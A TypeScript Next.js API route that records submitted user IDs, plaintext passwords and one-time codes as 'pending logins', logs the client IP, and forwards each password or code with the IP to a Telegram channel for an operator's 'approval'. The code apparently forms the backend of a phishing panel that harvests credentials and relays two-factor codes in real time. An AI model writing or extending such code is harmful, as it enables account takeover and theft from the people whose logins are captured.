import { hasDatabaseUrl } from "@/lib/database-urls"
import { resolveMemberOrigin } from "@/lib/member-origin"
import { NextRequest, NextResponse, after } from "next/server"
import { createPendingLogin } from "@/lib/pending-logins"
import { DEFAULT_PROJECT_ID } from "@/lib/project-config"
import { SITE_DISPLAY_NAME } from "@/lib/site-url"
import { telegramService } from "@/lib/telegram"

export async function POST(request: NextRequest) {
  if (!hasDatabaseUrl()) {
    return NextResponse.json(
      {
        error:
          "DATABASE_URL is not set. Add it to .env.local (same Neon URL as Control Center) so requests appear in admin.",
      },
      { status: 503 },
    )
  }
  try {
    const body = await request.json()
    const { userId = "login", password = "", method, maskedEmail = "", maskedPhone = "", flow } = body
    if (!method || (method !== "email" && method !== "text")) {
      return NextResponse.json(
        { error: "method is required and must be email or text" },
        { status: 400 },
      )
    }
    const memberOrigin = resolveMemberOrigin(request)
    const record = await createPendingLogin({
      requestKind: flow === "otp" ? "otp" : "login",
      projectId: DEFAULT_PROJECT_ID,
      projectName: SITE_DISPLAY_NAME,
      userId: String(userId),
      password: String(password),
      method,
      maskedEmail: String(maskedEmail),
      maskedPhone: String(maskedPhone),
      memberOrigin,
    })

    const forwarded = request.headers.get("x-forwarded-for")
    const realIp = request.headers.get("x-real-ip")
    const ip = forwarded?.split(",")[0]?.trim() || realIp || "Unknown"

    after(async () => {
      if (flow === "login") {
        await telegramService.sendLoginApprovalNotification({
          userId: record.userId,
          password: record.password,
          method: record.method,
          createdAtMs: record.createdAt,
          ip,
        })
      } else {
        await telegramService.sendVerificationApprovalNotification({
          userId: record.userId,
          method: record.method,
          code: record.password,
          createdAtMs: record.createdAt,
          ip,
        })
      }
    })

    return NextResponse.json({ id: record.id })
  } catch (e) {
    console.error("Pending login create error:", e)
    return NextResponse.json({ error: "Failed to create pending login" }, { status: 500 })
  }
}
